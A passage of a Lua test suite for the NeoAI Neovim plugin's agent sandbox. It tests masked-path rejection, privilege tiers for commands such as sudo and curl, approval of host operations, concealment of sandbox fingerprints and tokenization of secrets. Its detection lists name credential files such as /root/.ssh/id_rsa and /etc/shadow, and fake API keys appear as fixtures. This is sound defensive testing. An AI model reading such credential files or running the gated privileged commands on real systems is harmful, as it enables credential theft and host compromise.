      t.eq(file, runtime.is_masked_path("/proc/self/root" .. file), "/proc/<pid>/root 应解析到遮蔽文件")
      t.eq(file, runtime.is_masked_path("/proc/1/root" .. file), "/proc/1/root 应解析到遮蔽文件")
      -- 进程内 read_file 经符号链接/`/proc/self/root` 均应硬拒绝
      local function must_reject(path)
        local done, err = false, nil
        require("NeoAI.tools").execute("read_file", { filepath = path, description = "t" }, {})
          :then_(function(r)
            err = "OK:" .. tostring(r)
            done = true
          end, function(e)
            err = "ERR:" .. tostring(e and e.message or e)
            done = true
          end)
        t.true_(vim.wait(5000, function() return done end), "应快速返回")
        t.matches("宿主敏感遮蔽路径", err or "", "应硬拒绝: " .. tostring(path))
      end
      must_reject(link)
      must_reject("/proc/self/root" .. file)
      -- 非进程内 fs 工具（read_image，effect=network）的本地 file_path 也纳入遮蔽判定。
      local done, err = false, nil
      require("NeoAI.tools").execute("read_image", { file_path = file, description = "t" }, {})
        :then_(function(r)
          err = "OK:" .. tostring(r)
          done = true
        end, function(e)
          err = "ERR:" .. tostring(e and e.message or e)
          done = true
        end)
      t.true_(vim.wait(5000, function() return done end), "应快速返回")
      t.matches("宿主敏感遮蔽路径", err or "", "read_image 应硬拒绝，实际: " .. tostring(err))
    end)
    vim.fn.delete(link_dir, "rf")
    vim.fn.delete(dir, "rf")
  end)

  it("加固：mask_paths 硬命中优先于遮蔽目录软命中（非进程内 fs 工具不放行）", function(t)
    local fs = require("NeoAI.utils.fs")
    local home = "/root/neoai_mask_order_test"
    local proj = home .. "/proj"
    fs.ensure_dir(proj)
    fs.ensure_dir(home .. "/other")
    local secret = home .. "/other/secret.png"
    fs.write_file(secret, "x")
    local prev = vim.fn.getcwd()
    vim.fn.chdir(proj)
    with_config({ tools = { sandbox = { mask_dirs = { home }, mask_paths = { secret } } } }, function()
      local done, err = false, nil
      require("NeoAI.tools").execute("read_image", { file_path = secret, description = "t" }, {})
        :then_(function(r)
          err = "OK:" .. tostring(r)
          done = true
        end, function(e)
          err = "ERR:" .. tostring(e and e.message or e)
          done = true
        end)
      t.true_(vim.wait(5000, function() return done end), "应快速返回")
      t.matches("宿主敏感遮蔽路径", err or "", "mask_paths 应优先硬拒绝，实际: " .. tostring(err))
    end)
    vim.fn.chdir(prev)
    vim.fn.delete(home, "rf")
  end)

  it("权限档位：命令分类与最高档校验", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local spec = { effect = "process" }
    t.eq(0, privilege.classify("run_command", { command = "ls -la" }, spec).tier, "普通命令应为 T0")
    local docker = privilege.classify("run_command", { command = "docker ps" }, spec)
    t.eq(1, docker.tier, "docker 命令应为 T1")
    t.true_(docker.docker, "应标记需要 docker")
    local net = privilege.classify("run_command", { command = "curl https://x" }, spec)
    t.eq(1, net.tier, "网络命令应为 T1")
    local sudo = privilege.classify("run_command", { command = "sudo mount /dev/x" }, spec)
    t.eq(2, sudo.tier, "sudo/mount 应为 T2")
    t.eq(0, privilege.classify("read_file", { filepath = "/x" }, { effect = "read" }).tier, "非 process 应 T0")
    -- 复合命令取最高档
    t.eq(2, privilege.classify("run_command", { command = "ls && sudo id" }, spec).tier, "复合命令取最高档")
    -- 最高档校验
    with_config({ tools = { sandbox = { privilege = { max_tier = 1 } } } }, function()
      t.false_(privilege.resolve(2, { tier = 2 }).ok, "超过 max_tier 应拒绝")
      t.true_(privilege.resolve(1, { tier = 1 }).ok, "等于 max_tier 应放行")
    end)
  end)

  it("权限档位：T0 默认放行网络（仅记录），offline 时硬隔离", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local privilege = require("NeoAI.sandbox.privilege")
    if runtime.backend() ~= "bwrap" then return end
    local t0 = privilege.resolve(0, { tier = 0 })
    local pre0 = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = t0.privileges }), " ")
    t.true_(pre0:find("--unshare-net", 1, true) == nil, "T0 默认不应隔离网络（仅记录）")
    local t1 = privilege.resolve(1, { tier = 1, network = true })
    local pre1 = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = t1.privileges }), " ")
    t.true_(pre1:find("--unshare-net", 1, true) == nil, "T1 不应隔离网络")
    -- T2 走嵌套 userns
    local t2 = privilege.resolve(2, { tier = 2, network = true })
    local pre2 = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = t2.privileges }), " ")
    t.true_(pre2:find("--unshare-all", 1, true) ~= nil, "T2 应新建 user namespace")
    -- offline=true 硬隔离，优先于档位
    with_config({ tools = { sandbox = { offline = true } } }, function()
      local preo = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = t0.privileges }), " ")
      t.true_(preo:find("--unshare-net", 1, true) ~= nil, "offline=true 应隔离网络")
    end)
  end)

  it("受控 docker：T1 挂载受控 socket 而非宿主 socket", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    local privilege = require("NeoAI.sandbox.privilege")
    if runtime.backend() ~= "bwrap" then return end
    local fs = require("NeoAI.utils.fs")
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local sock = dir .. "/docker.sock"
    fs.write_file(sock, "")
    with_config({ tools = { sandbox = { docker = { mode = "controlled", socket = sock } } } }, function()
      local res = privilege.resolve(1, { tier = 1, docker = true, network = true })
      t.true_(res.ok, "受控 socket 存在时应可解析 T1")
      t.eq(sock, res.privileges.mounts[1] and res.privileges.mounts[1].src, "应挂载受控 socket")
      t.eq("/var/run/docker.sock", res.privileges.mounts[1].dst, "应挂载到 docker.sock")
      t.eq("unix:///var/run/docker.sock", res.privileges.env.DOCKER_HOST, "应注入 DOCKER_HOST")
      local pre = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = res.privileges }), " ")
      t.true_(pre:find("--bind " .. sock .. " /var/run/docker.sock", 1, true) ~= nil, "前缀应绑定受控 socket")
      t.true_(pre:find("--bind /dev/null /var/run/docker.sock", 1, true) == nil, "不应遮蔽受控 socket")
    end)
    -- socket 缺失 → 明确拒绝
    with_config({ tools = { sandbox = { docker = { mode = "controlled", socket = "/nonexistent/docker.sock" } } } }, function()
      local res = privilege.resolve(1, { tier = 1, docker = true })
      t.false_(res.ok, "受控 socket 缺失应拒绝")
      t.matches("DOCKER_SOCKET", tostring(res.reason))
    end)
    vim.fn.delete(dir, "rf")
  end)

  it("权限档位：策略对越界档位硬拒绝", function(t)
    local policy = require("NeoAI.sandbox.policy")
    with_config({ tools = { sandbox = { privilege = { max_tier = 1 } } } }, function()
      local v = policy.evaluate({
        tool = "run_command", effect = "process", args = { command = "sudo id" },
        privilege = { tier = 2 },
      })
      t.eq("DENY", v.decision, "越界档位应硬拒绝")
      t.true_(vim.tbl_contains(v.reason_codes, "PRIVILEGE_TIER_EXCEEDS_MAX"), "应带越界原因")
    end)
  end)

  it("权限档位：失败检测与自动升级（记录事件，不静默）", function(t)
    local privilege = require("NeoAI.sandbox.privilege")
    local esc = privilege.detect_escalation({ code = 6, stderr = "curl: (6) Could not resolve host: x" })
    t.not_nil(esc, "网络失败应建议升级")
    t.eq(1, esc.tier, "网络失败应为 T1")
    local perm = privilege.detect_escalation({ code = 1, stderr = "mount: Operation not permitted" })
    t.eq(2, perm.tier, "权限拒绝应为 T2")
    t.eq(nil, privilege.detect_escalation({ code = 0, stderr = "could not resolve host" }), "成功不应升级")

    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local events = require("NeoAI.kernel.events")
    local event_bus = require("NeoAI.kernel.event_bus")
    local got = false
    local unsub = event_bus.on(events.SANDBOX_PRIVILEGE_ESCALATION_REQUESTED, function() got = true end)
    local sandbox = require("NeoAI.sandbox")
    with_config({
      tools = {
        approval = { mode = "async" },
        sandbox = { mode = "dry_run", review = { enabled = true }, privilege = { auto_escalate = true, max_tier = 2 } },
      },
    }, function()
      sandbox.reset()
      local done = false
      -- 该命令本身未命中分类（T0），但失败输出命中网络失败模式 → 自动发起 T1 升级。
      require("NeoAI.tools").execute("run_command", {
        command = "sh -c 'echo \"could not resolve host: x\" >&2; exit 6'",
        description = "t",
      }, {}):then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(12000, function() return done end), "命令应完成")
      t.true_(got, "应触发自动升级事件")
    end)
    if unsub then pcall(unsub) end
  end)

  it("主机操作：冻结提案、审批后 replay、拒绝不执行", function(t)
    local sandbox = require("NeoAI.sandbox")
    local hostop = require("NeoAI.sandbox.hostop")
    with_config({ tools = { sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local control = require("NeoAI.sandbox.control")
      control.reset()
      local attempt = control.new_attempt("run_command", { command = "echo HOST_OP_OK" }, {}, { effect = "process" })
      local rec = hostop.freeze(attempt, { command = "echo HOST_OP_OK" }, { tier = 2 }, { reason = "test" })
      t.not_nil(rec, "应冻结提案")
      local found
      for _, it in ipairs(sandbox.list_reviews({ review_state = "PENDING" })) do
        if it.kind == "host_op" and it.host_op_id == rec.host_op_id then found = it end
      end
      t.not_nil(found, "提案应进入待审队列")
      t.false_(sandbox.apply(found.change_set_id).ok, "未审批不应执行")
      sandbox.approve(found.change_set_id)
      local res = sandbox.apply(found.change_set_id)
      t.true_(res.ok, "审批后应执行成功")
      t.true_(res.result and tostring(res.result.stdout):find("HOST_OP_OK", 1, true) ~= nil, "应捕获主机输出")
      -- 拒绝不执行
      local rec2 = hostop.freeze(attempt, { command = "echo SHOULD_NOT_RUN" }, { tier = 2 }, {})
      local found2
      for _, it in ipairs(sandbox.list_reviews({ review_state = "PENDING" })) do
        if it.kind == "host_op" and it.host_op_id == rec2.host_op_id then found2 = it end
      end
      sandbox.reject(found2.change_set_id, "no")
      t.eq("REJECTED", hostop.get(rec2.host_op_id).state, "拒绝后提案应为 REJECTED")
    end)
  end)

  it("主机操作 replay：等待期间不冻结事件循环（UI 计时器可刷新）", function(t)
    local hostop = require("NeoAI.sandbox.hostop")
    local store = require("NeoAI.sandbox.store")
    local saved_root = store.root()
    store.init(vim.fn.tempname() .. "-hostop-nonblock")
    hostop.reset()
    store.write_host_op({
      host_op_id = "ho_nonblock", command = "sleep 0.4; echo TICK_OK",
      tool = "run_command", command_id = "c_nb", attempt_id = "a_nb", tier = 2,
      state = "PENDING", created_at = os.time(),
    })
    local ticked = false
    local timer = vim.fn.timer_start(100, function() ticked = true end, vim.empty_dict())
    local res = hostop.replay("ho_nonblock")
    pcall(vim.fn.timer_stop, timer)
    t.true_(res.ok, "replay 应成功")
    t.true_(ticked, "等待主机命令期间事件循环应继续运行（计时器已触发）")
    t.true_(tostring(res.result and res.result.stdout or ""):find("TICK_OK", 1, true) ~= nil, "应捕获主机输出")
    hostop.reset()
    if saved_root then store.init(saved_root) else store.reset() end
  end)

  it("主机操作：T2 命令自动冻结主机提案", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    with_config({
      tools = {
        approval = { mode = "async" },
        sandbox = { mode = "dry_run", review = { enabled = true }, privilege = { max_tier = 2 } },
      },
    }, function()
      sandbox.reset()
      local done = false
      -- 用真正的 T2 命令（只读的 `mount`/`mount --version` 已不再触发 T2）。
      require("NeoAI.tools").execute("run_command", { command = "umount /mnt", description = "t" }, {})
        :then_(function() done = true end, function() done = true end)
      t.true_(vim.wait(12000, function() return done end), "命令应完成")
      t.true_(#require("NeoAI.sandbox.hostop").list({}) >= 1, "T2 命令应冻结主机提案")
    end)
  end)

  it("隐匿：输出脱敏抹去 bwrap/overlay/沙箱指纹", function(t)
    local conceal = require("NeoAI.sandbox.conceal")
    local s = conceal.redact("bwrap --unshare-all NeoAI-sandbox /tmp/.neoai_session "
      .. "lowerdir=/dev/shm/x upperdir=/y workdir=/z type overlay; overlay on /root type overlay")
    t.true_(s:find("bwrap", 1, true) == nil, "不应残留 bwrap")
    t.true_(s:find("NeoAI-sandbox", 1, true) == nil, "不应残留 NeoAI-sandbox")
    t.true_(s:find("neoai_session", 1, true) == nil, "不应残留 neoai_session")
    t.true_(s:find("lowerdir=/dev/shm/x", 1, true) == nil, "应隐藏 lowerdir 路径")
    t.true_(s:find("type overlay", 1, true) == nil, "应隐藏 overlay 挂载类型")
    t.true_(s:find("overlay on", 1, true) == nil, "应隐藏 mount 的 overlay 前缀")
    t.eq("", conceal.redact(""), "空串原样返回")
    t.eq(nil, conceal.redact(nil), "nil 原样返回")
  end)

  it("隐匿：run_command 回传输出经脱敏且 PID1 非 bwrap", function(t)
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "echo NeoAI-sandbox bwrap; tr '\\0' ' ' < /proc/1/cmdline; echo",
        description = "t",
      }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(not s:find("NeoAI-sandbox", 1, true), "输出不应含 NeoAI-sandbox")
        t.true_(not s:find("bwrap", 1, true), "输出不应含 bwrap")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "run_command 应完成")
    end)
  end)

  it("密钥防护：熵检测与 token 往返", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    local found = secret.detect("KEY=" .. fake .. " end")
    t.eq(1, #found, "应检测到 1 个高熵候选")
    t.eq(fake, found[1].value)
    -- 纯小写十六进制（git sha/sha256）不应被当作密钥
    t.eq(0, #secret.detect("sha=a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"))
    local tok, used = secret.tokenize("v=" .. fake)
    t.true_(#used == 1, "应生成 1 个 token")
    t.true_(secret.has_token(tok), "结果应含 token")
    t.true_(not secret.find_real_secret(tok), "token 化后不应含原始密钥")
    local back, unresolved = secret.detokenize(tok)
    t.eq("v=" .. fake, back, "应可无损还原")
    t.eq(0, unresolved, "应全部解析")
    local _, u2 = secret.detokenize("NEOKEY_deadbeef")
    t.eq(1, u2, "未知 token 应计为 unresolved")
    secret.reset()
  end)

  it("密钥防护：缩小认定范围（内容哈希/base64 不 token 化，上下文仍认定）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    -- SRI integrity / 内容哈希：即便含 `-`，也不应被 token 化（否则破坏 package-lock.json）
    local sri = '"integrity": "sha512-9BvYg0kq3s0mC1uQ0m5r8pQ2xY6wZ1aB3cD4eF5gH6iJ7kL8mN9oP0qR1sT2uV3wX4yZ5a6b7c8d9e0f1g2h=="'
    t.eq(sri, (secret.tokenize(sri)), "SRI integrity 不应被 token 化")
    t.eq(0, #secret.detect(sri), "SRI integrity 不应被识别为密钥")
    local sha = "sha256-a1b2c3d4e5f60718293a4b5c6d7e8f9012345678abcdef"
    t.eq(sha, (secret.tokenize(sha)), "带算法前缀的哈希不应被 token 化")
    -- 无分隔符的裸高熵串（base64/随机）不再视为密钥
    local bare = "blob Zx9Qw2Lm7Pk4Rt8Yv3Bn6Hd1Sg5Jf0Ac end"
    t.eq(bare, (secret.tokenize(bare)), "无上下文的裸高熵串不应被 token 化")
    t.eq(0, #secret.detect(bare), "无上下文的裸高熵串不应被识别")
    -- 敏感变量名上下文仍认定（纯字母数字值也 token 化）
    local ctx = "API_KEY=Zx9Qw2Lm7Pk4Rt8Yv3Bn6Hd1Sg5Jf0Ac"
    local out, used = secret.tokenize(ctx)
    t.true_(#used == 1, "敏感名赋值应被 token 化")
    t.eq(ctx, (secret.detokenize(out)), "上下文密钥应可无损还原")
    -- 密钥形态（含分隔符）仍认定
    local key = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    t.matches("NEOKEY_", (secret.tokenize(key)), "带分隔符的密钥形态仍应被 token 化")
    secret.reset()
  end)

  it("密钥防护：代码标识符（snake_case 函数名/常量）不被误判为密钥", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    -- 工具输出里的 Python 回溯函数名不应被 token 化（否则污染模型可见结果）
    local tb = 'File "/x/urllib3/util/ssl_.py", line 220, in create_urllib3_context'
    t.eq(tb, (secret.tokenize(tb)), "回溯函数名不应被 token 化")
    t.eq(0, #secret.detect(tb), "回溯函数名不应被识别为密钥")
    local const = "HTTP_SSL_CONTEXT_V2_API"
    t.eq(const, (secret.tokenize(const)), "全大写常量名不应被 token 化")
    -- 软件包名/版本串（含纯数字段）不应被 token 化（dpkg -l 输出误报回归）
    for _, pkg in ipairs({
      "openjdk-21-jdk-headless", "openjdk-21-jre-headless", "libssl-dev", "libapache-pom-java",
      "python3.11-minimal", "golang-1.21", "nodejs-18", "libx264-164",
    }) do
      t.eq(pkg, (secret.tokenize(pkg)), "软件包名不应被 token 化: " .. pkg)
      t.eq(0, #secret.detect(pkg), "软件包名不应被识别为密钥: " .. pkg)
    end
    -- 真正的密钥形态（混合大小写 + 分隔符）仍应被 token 化
    local key = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    t.matches("NEOKEY_", (secret.tokenize(key)), "混合大小写密钥形态仍应被 token 化")
    -- 敏感变量名上下文中的小写值仍强制脱敏
    local ctx = "API_KEY=my_lowercase_secret_value_1234"
    t.matches("NEOKEY_", (secret.tokenize(ctx)), "敏感名上下文仍应脱敏")
    secret.reset()
  end)

  it("密钥防护：路径分量不被 token 化（不破坏 PATH/LD_LIBRARY_PATH/pip）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    -- 路径中的高熵目录段不应被 token 化，否则程序找不到库/模块（如 pip 报 ssl module 缺失）
    local path = "/opt/build_0abc123def456789abcdef/lib"
    t.eq(path, (secret.tokenize(path)), "路径分量不应被 token 化")
    local list = "/opt/lib:/secret_abc123def4567890abcdef"
    t.eq(list, (secret.tokenize(list)), "路径列表不应被 token 化")
    -- URL 中的结构化凭据仍应脱敏
    local url = "https://user:sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5@host/simple"
    t.matches("NEOKEY_", (secret.tokenize(url)), "URL 中的凭据仍应被 token 化")
    -- 路径类环境变量（LD_LIBRARY_PATH / CA bundle）不应被覆盖
    vim.env.NEOAI_TEST_LD_LIBRARY_PATH = path
    vim.env.NEOAI_TEST_CA_BUNDLE = "/etc/ssl/certs/build_0abc123def456789abcdef.pem"
    local ov = secret.sanitized_env()
    t.eq(nil, ov.NEOAI_TEST_LD_LIBRARY_PATH, "路径类环境变量不应被 token 化")
    t.eq(nil, ov.NEOAI_TEST_CA_BUNDLE, "证书路径不应被 token 化")
    vim.env.NEOAI_TEST_LD_LIBRARY_PATH = nil
    vim.env.NEOAI_TEST_CA_BUNDLE = nil
    secret.reset()
  end)

  it("密钥防护：高熵扫描按密钥文件门控（entropy=false 仅保留具名规则）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    -- 不匹配任何具名规则的高熵密钥形态串（仅靠熵检测命中）
    local key = "Zx9Kd-Qm2Lp5Zr8Tv1Wn4Bc"
    t.matches("NEOKEY_", (secret.tokenize(key)), "默认应做熵扫描")
    t.eq(key, (secret.tokenize(key, { entropy = false })), "关闭熵扫描后高熵串应原样保留")
    local aws = "AKIAIOSFODNN7EXAMPLE"
    t.matches("NEOKEY_", (secret.tokenize(aws, { entropy = false })), "具名规则不受熵开关影响")
    local out = secret.tokenize_result({ output = key, id = aws }, { entropy = false })
    t.eq(key, out.output, "结果字段高熵串不应 token 化")
    t.matches("NEOKEY_", out.id, "结果字段具名规则仍 token 化")
    secret.reset()
  end)

  it("密钥防护：普通文件不做高熵 token 化，疑似密钥文件才做", function(t)
    local fs = require("NeoAI.utils.fs")
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local key = "Zx9Kd-Qm2Lp5Zr8Tv1Wn4Bc"
    local plain = "/tmp/neoai_entropy_plain.txt"
    local envf = "/tmp/.env"
    fs.write_file(plain, "value " .. key .. "\n")
    fs.write_file(envf, "value " .. key .. "\n")
    local function read(p)
      local done, res = false, nil
      require("NeoAI.tools").execute("read_file", { filepath = p, description = "t" }, {})
        :then_(function(r) res = tostring(r); done = true end,
          function(e) res = "ERR:" .. tostring(e and e.message or e); done = true end)
      t.true_(vim.wait(10000, function() return done end), "read_file 应完成")
      return res
    end
    local r1 = read(plain)
    t.true_(r1:find(key, 1, true) ~= nil, "普通文件高熵串应原样返回，实际: " .. tostring(r1))
    local r2 = read(envf)
    t.true_(r2:find("NEOKEY_", 1, true) ~= nil, "疑似密钥文件高熵串应被 token 化，实际: " .. tostring(r2))
    fs.delete_file(plain)
    fs.delete_file(envf)
    secret.reset()
  end)

  it("密钥防护：疑似密钥文件路径判定（shell rc / 历史 / /etc）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    t.true_(secret.is_secret_path("/root/.bashrc"), ".bashrc 应视为密钥文件")
    t.true_(secret.is_secret_path("/root/.zshrc"), ".zshrc 应视为密钥文件")
    t.true_(secret.is_secret_path("/root/.bash_history"), "历史文件应视为密钥文件")
    t.true_(secret.is_secret_path("/etc/shadow"), "/etc 下应视为密钥文件")
    t.true_(secret.is_secret_path("/etc/ssh/sshd_config"), "/etc 下应视为密钥文件")
    t.false_(secret.is_secret_path("/tmp/notes.txt"), "普通文件不应视为密钥文件")
    -- 公开 CA 证书包（pip/certifi、系统信任库）不是密钥，不应触发高熵扫描
    t.false_(secret.is_secret_path(
      "/root/test/python-app/.venv/lib/python3.13/site-packages/pip/_vendor/certifi/cacert.pem"),
      "certifi CA bundle 不应视为疑似密钥文件")
  end)

  it("密钥防护：告警严口径路径判定（排除普通系统文件/历史）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    -- 真正的凭据文件
    for _, p in ipairs({
      "/root/.ssh/id_rsa", "/root/.aws/credentials", "/root/.config/gcloud/application_default_credentials.json",
      "/root/.kube/config", "/proj/.env", "/proj/.env.local", "/x/server.key",
      "/etc/shadow", "/etc/sudoers", "/etc/ssh/sshd_config", "/etc/apt/trusted.gpg.d/x.gpg",
      "/root/.local/share/keyrings/login.keyring",
    }) do
      t.true_(secret.is_sensitive_path(p), "应视为凭据文件: " .. p)
    end
    -- 普通命令频繁打开、并非密钥的路径（误报来源）
    for _, p in ipairs({
      "/etc/ld.so.cache", "/etc/nsswitch.conf", "/etc/passwd", "/etc/group",
      "/etc/os-release", "/etc/localtime", "/etc/ssl/openssl.cnf",
      "/usr/local/go/go.env", "/etc/rustup/settings.toml", "/root/.npmrc",
      "/root/.bash_history", "/root/.python_history", "/tmp/notes.txt",
      -- 公开 CA 证书包（pip 随包 vendored 的 certifi、系统信任库）不是凭据
      "/root/test/python-app/.venv/lib/python3.13/site-packages/pip/_vendor/certifi/cacert.pem",
      "/etc/ssl/certs/ca-certificates.pem",
      "/usr/lib/python3/dist-packages/certifi/cacert.pem",
    }) do
      t.false_(secret.is_sensitive_path(p), "不应视为凭据文件: " .. p)
    end
  end)

  it("密钥防护：工具结果中的原始密钥被 token 化", function(t)
    local secret = require("NeoAI.sandbox.secret")
    local runtime = require("NeoAI.sandbox.runtime")
    if runtime.backend() ~= "bwrap" then return end
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    local sandbox = require("NeoAI.sandbox")
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("run_command", {
        command = "printf '%s\\n' '" .. fake .. "'",
        description = "t",
      }, {}):then_(function(r)
        local s = tostring(r)
        t.true_(not s:find(fake, 1, true), "模型可见输出不应含原始密钥")
        t.true_(secret.has_token(s), "模型可见输出应含 token")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(15000, function() return done end), "run_command 应完成")
    end)
    secret.reset()
  end)

  it("密钥防护：工具参数出现原始密钥时硬拦截并终止 Agent", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    secret.tokenize(fake)
    local abort_reason
    local agent = {
      id = "a_secret_test",
      signal = {
        abort = function(_, r) abort_reason = r end,
        reason = function() return abort_reason end,
        aborted = function() return abort_reason ~= nil end,
      },
    }
    local done = false
    require("NeoAI.tools").execute("run_command", {
      command = "echo " .. fake,
      description = "t",
    }, { agent = agent }):then_(function()
      t.true_(false, "含原始密钥的调用应被拒绝")
      done = true
    end, function(e)
      t.matches("SANDBOX_SECRET_BLOCKED", tostring(e and e.message or e))
      t.eq("secret_exposure", abort_reason, "应立即终止整个 Agent")
      done = true
    end)
    t.true_(vim.wait(5000, function() return done end), "应快速拒绝")
    secret.reset()
  end)

  it("密钥防护：AI 上下文出现原始密钥时终止 Agent（token 不终止）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    local tok = secret.tokenize(fake)
    t.true_(secret.has_token(tok), "应生成 token")
    local recovery = require("NeoAI.core.agent.recovery")
    local abort_reason
    local agent = {
      id = "a_ctx_secret",
      signal = {
        abort = function(_, r) abort_reason = r end,
        reason = function() return abort_reason end,
        aborted = function() return abort_reason ~= nil end,
      },
    }
    -- 原始密钥出现在 AI 可见上下文（wire 消息）→ 终止整个 Agent
    local ok, err = recovery._guard_secret_context(agent,
      { { role = "assistant", content = "KEY=" .. fake } })
    t.false_(ok, "上下文含原始密钥应被拒绝")
    t.matches("SANDBOX_SECRET_BLOCKED", tostring(err and err.message or err))
    t.eq("secret_exposure", abort_reason, "应终止整个 Agent")
    -- token（KEY 环境变量操作）出现在上下文不终止
    t.true_(recovery._guard_secret_context(agent,
      { { role = "assistant", content = "KEY=" .. tok } }), "token 不应终止 Agent")
    secret.reset()
  end)

  it("密钥防护：KEY 环境变量 token 操作只提级审批、不终止", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    local tok = secret.tokenize(fake)
    local ctx = {}
    local done = false
    require("NeoAI.tools").execute("read_file", {
      filepath = "/nonexistent/" .. tok, description = "t",
    }, ctx):then_(function() done = true end, function() done = true end)
    t.true_(vim.wait(5000, function() return done end), "应完成")
    t.eq(true, ctx.secret_operation, "token 操作应提级审批（secret_operation），而非终止")
    secret.reset()
  end)

  it("密钥防护：commit 发布时把 token 还原为真实密钥并留痕警告", function(t)
    local secret = require("NeoAI.sandbox.secret")
    local fs = require("NeoAI.utils.fs")
    local sandbox = require("NeoAI.sandbox")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    local dir = vim.fn.tempname()
    fs.ensure_dir(dir)
    local p = dir .. "/cfg.env"
    with_config({ tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } } }, function()
      sandbox.reset()
      local done = false
      require("NeoAI.tools").execute("edit_file", {
        filepath = p, mode = "write", content = "KEY=" .. fake .. "\n", description = "t",
      }, {}):then_(function()
        local items = sandbox.list_reviews({ review_state = "PENDING" })
        local found
        for _, it in ipairs(items) do
          for _, f in ipairs(it.files or {}) do if f.path == p then found = it end end
        end
        t.not_nil(found, "应产生待审变更单元")
        t.true_(found.secret_warning and found.secret_warning.count > 0, "应带密钥操作警告")
        local res = sandbox.apply(found.change_set_id, { auto_approve = true })
        t.true_(res.ok, tostring(res.reason))
        local content = fs.read_file(p) or ""
        t.true_(content:find(fake, 1, true) ~= nil, "真实文件应还原为原始密钥")
        t.true_(not secret.has_token(content), "真实文件不应残留 token")
        done = true
      end, function(e)
        t.true_(false, "不应失败: " .. tostring(e and e.message or e))
        done = true
      end)
      t.true_(vim.wait(5000, function() return done end), "edit_file 应完成")
    end)
    vim.fn.delete(dir, "rf")
    secret.reset()
  end)

  it("密钥防护：run_command 环境变量中的密钥被替换为 token", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
    vim.env.NEOAI_TEST_API_KEY = fake
    local overrides = secret.sanitized_env()
    t.true_(overrides.NEOAI_TEST_API_KEY ~= nil, "应覆盖该环境变量")
    t.true_(not tostring(overrides.NEOAI_TEST_API_KEY):find(fake, 1, true), "覆盖值不应含原始密钥")
    vim.env.NEOAI_TEST_API_KEY = nil
    secret.reset()
  end)

  it("密钥防护：纯 hex 密钥按变量名强制 token 化", function(t)
    local secret = require("NeoAI.sandbox.secret")
    secret.reset()
    local hexkey = "dfe946fb66864c48927f31f2aa49164d"
    vim.env.NEOAI_TEST_GLM_API_KEY = hexkey
    local overrides = secret.sanitized_env()
    t.true_(overrides.NEOAI_TEST_GLM_API_KEY ~= nil, "纯 hex 的 *_API_KEY 也应被覆盖")
    t.true_(not tostring(overrides.NEOAI_TEST_GLM_API_KEY):find(hexkey, 1, true), "覆盖值不应含原始密钥")
    vim.env.NEOAI_TEST_PLAIN = "hello"
    local ov2 = secret.sanitized_env()
    t.eq(nil, ov2.NEOAI_TEST_PLAIN, "普通低熵变量不应被 token 化")
    vim.env.NEOAI_TEST_GLM_API_KEY = nil
    vim.env.NEOAI_TEST_PLAIN = nil
    secret.reset()
  end)

  it("密钥防护：沙箱进程拿到真实密钥（env + 命令 token 还原，仅限沙箱内）", function(t)
    local secret = require("NeoAI.sandbox.secret")
    local runtime = require("NeoAI.sandbox.runtime")
    secret.reset()
    local fake = "sk-Ab3xY9pQ2mNv7Kd4Lw8Zr1Tg6Hs5"
